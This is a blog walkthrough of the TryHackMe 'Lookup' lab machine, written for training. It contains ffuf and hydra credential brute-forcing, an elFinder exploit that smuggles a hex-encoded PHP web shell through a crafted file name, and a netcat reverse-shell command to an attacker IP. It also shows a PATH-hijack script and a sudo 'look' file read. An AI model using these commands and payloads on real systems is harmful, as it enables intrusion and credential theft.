---
title: "TryHackMe: Lookup"
author: cilgin
date: 2025-06-27 17:59:47 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-27-TryHackMe-Lookup/main.png
---

Hey everyone, and welcome to my walkthrough for the "Lookup" room on [TryHackMe](https://tryhackme.com/room/lookup)! I had a blast with this one, so grab your favorite beverage, fire up your terminal, and let's get hacking.

---

## Nmap Scan: The First Knock

First things first, let's make our lives a little easier. Constantly typing or copy-pasting an IP address is a recipe for typos and frustration. I'm exporting the target IP to an environment variable. Trust me, your future self will thank you.

```bash
export IP=10.10.219.52
```

With our trusty `$IP` variable ready, it's time to unleash `nmap` to see what doors are open.

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-27 17:58 +0300
Nmap scan report for 10.10.219.52
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:86:69:de:5a:2b:d9:2d:e4:66:63:31:59:8c:b9:51 (RSA)
|   256 42:53:6f:97:c3:7d:bb:cc:a0:38:ed:4f:b2:73:28:32 (ECDSA)
|_  256 c4:44:35:6d:9b:51:ca:03:1b:42:0f:51:ac:34:fd:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.29 seconds
```

The scan reveals two open ports: SSH (22) and HTTP (80). The HTTP title gives us a huge clue: `Did not follow redirect to http://lookup.thm`. This means the web server is configured to respond to a domain name, not just the IP address.

Let's try a quick `curl` just to confirm.

```bash
curl $IP
```

As expected, we get no output. Time to fire up the browser! Navigating to the IP address confirms the redirect. To make our computer understand what `lookup.thm` is, we need to add it to our `/etc/hosts` file, pointing it to the target's IP.

```text
# Add this line to your /etc/hosts file
10.10.219.52    lookup.thm
```

With that done, browsing to `http://lookup.thm` finally shows us the website!

![Desktop View](/assets/img/2025-06-27-TryHackMe-Lookup/photo1.png){: width="646" height="407" }

Naturally, I tried the classic `admin:admin` combo. It didn't work, of course. That would be too easy! Time to do some proper reconnaissance.

Let's fuzz the server for hidden directories and files with `gobuster`.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://lookup.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              md,js,html,php,py,css,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 719]
/login.php            (Status: 200) [Size: 1]
/server-status        (Status: 403) [Size: 275]
/styles.css           (Status: 200) [Size: 687]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

Bingo! `login.php` looks very promising. This is likely where we need to focus our brute-force efforts. By intercepting a login attempt with Burp Suite (or just watching the network tab in the browser), I can see the POST request format:

```text
admin=admin&password=admin
```

My first guess is that the username is `admin`. Let's fire up `ffuf` to find the password. The `-fw 8` flag filters out responses with 8 words, which is the size of the "Invalid credentials" response.

```bash
❯ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

*************             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 75ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

We found a password! I tried logging in with `admin` and our shiny new password, but... it didn't work. What a plot twist! This means my initial assumption was wrong, and the username is probably not `admin`.

Time for round two. Let's fuzz the username, using the password we just found. I'll filter out responses with 10 words this time.

```bash
❯ ffuf -w /usr/share/wordlists/seclists/Usernames/xato_net_usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 10

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato_net_usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=FUZZ&password=REDACTED
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10
________________________________________________

****                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
```

Success! A `302` status code indicates a successful redirect after login. We have our credentials!

Logging in with our newly found username and password works, but it immediately routes me to `files.lookup.thm`. Time to edit `/etc/hosts` again!

```text
# Add this second domain to the line in your /etc/hosts file
10.10.219.52    lookup.thm files.lookup.thm
```

After adding the new domain, I'm greeted by a web-based file manager.

![Desktop View](/assets/img/2025-06-27-TryHackMe-Lookup/photo2.png){: width="525" height="537" }

My first instinct is to check the software version for any known vulnerabilities. A quick search leads me to [this exploit on Exploit-DB](https://www.exploit-db.com/exploits/46481).

The exploit is written in Python 2. Since Python 2 is ancient and can be a pain to get running, I decided to analyze the script and perform the steps manually. It's better practice anyway! The exploit works in a few clever steps:

1.  Upload a regular JPEG file.
2.  Rename the file to a specially crafted name. This command decodes a hex string into a PHP web shell and names the file `shell.php`... but keeps a `.jpg` extension to fool the server.
    ```bash
    $(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
    ```
    The hex decodes to: `<?php system($_GET["c"]); ?>`
3.  Use the file manager's "rotate image" feature and click "Apply". This triggers a bug where the server re-processes the file, stripping the `.jpg` extension and leaving us with `shell.php`.
4.  You'll get an error, but that's expected. The magic has already happened.

Now, we can access our shell and execute commands via the `c` parameter in the URL.

```bash
❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have command execution as the `www-data` user!

## Gaining a Reverse Shell

A web shell is nice, but a proper interactive reverse shell is way better. I used [revshells.com](https://www.revshells.com/) to generate a payload, URL-encoded it, and sent it with `curl`.

```bash
❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20[YOUR_IP]%204444%20%3E%2Ftmp%2Ff'
```

And just like that, a shell pops on my `netcat` listener. We're in!

```bash
www-data@ip-10-10-219-52:/home$ ls
ssm-user
think
ubuntu
```

## Privilege Escalation: Part 1 (www-data -> think)

I ran `linpeas.sh` on the machine and it highlighted a very interesting SUID binary: `/usr/sbin/pwm`.

```bash
www-data@ip-10-10-219-52:/usr/sbin$ ls -la pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 pwm
www-data@ip-10-10-219-52:/usr/sbin$ ./pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

Aha! The program helpfully tells us it's running the `id` command. If the developer didn't use an absolute path (like `/usr/bin/id`), the system will search for `id` in the directories listed in our `PATH` environment variable. This smells like a classic PATH Hijacking opportunity!

Let's check `/etc/passwd` to find a user to impersonate. The user `think` with UID/GID 1000 looks like a good target.

```bash
www-data@ip-10-10-219-52:/usr/sbin$ cat /etc/passwd | grep think
think:x:1000:1000:,,,:/home/think:/bin/bash
```

Now for the hijack. We'll create our own fake `id` script in `/tmp` (a world-writable directory) that outputs `think`'s user info. Then, we'll prepend `/tmp` to our `PATH`.

```bash
# Set our PATH so the system looks in /tmp first
export PATH=/tmp:$PATH

# Create a malicious 'id' script in /tmp
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=33(www-data)"' > /tmp/id

# Make it executable
chmod +x /tmp/id
```

Now, when we run the `pwm` binary, it will execute *our* `id` script instead of the real one. It will be tricked into thinking we are the user `think` and will hopefully leak `think`'s passwords.

```bash
www-data@ip-10-10-219-52:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
...
jose.2856171
```

It worked! The binary dumped a list of passwords. I saved them to a file and used `hydra` to brute-force the SSH login for the user `think`.

```bash
❯ hydra -l think -P passwords.txt ssh://lookup.thm
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 19:49:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: *************
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 19:49:34
```

With the password found, I can SSH in as `think` and grab the user flag.

```bash
think@ip-10-10-219-52:~$ cat user.txt
**********************************
```

## Privilege Escalation: Part 2 (think -> root)

One flag down, one to go. Let's see what `sudo` privileges we have.

```bash
think@ip-10-10-219-52:~$ sudo -l
[sudo] password for think:
Matching Defaults entries for think on ip-10-10-219-52:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-10-219-52:
    (ALL) /usr/bin/look
```

Interesting. We can run the `/usr/bin/look` command as any user, including root. A quick `man look` shows it's used to find lines in a sorted file. It also uses `/usr/share/dict/words` as a default dictionary. Let's see what happens when we point it at the root flag.

```bash
think@ip-10-10-219-52:~$ sudo look /root/root.txt
look: /usr/share/dict/words: No such file or directory
```

The command fails because the dictionary file doesn't exist. My first thought was to try creating a malicious `words` file, but a quick check shows we don't have write permissions in `/usr/share/dict/`.

However, the `look` command takes a search string as its first argument. What if the program doesn't actually *need* the dictionary file if we provide all the necessary arguments? Let's try giving it an empty string as the search term, which should match every line, and point it directly at the root flag.

```bash
think@ip-10-10-219-52:~$ sudo /usr/bin/look '' /root/root.txt
*********************************
```

And there it is! The root flag is ours. This was a super fun box with some great, realistic privilege escalation paths. Thanks for reading!
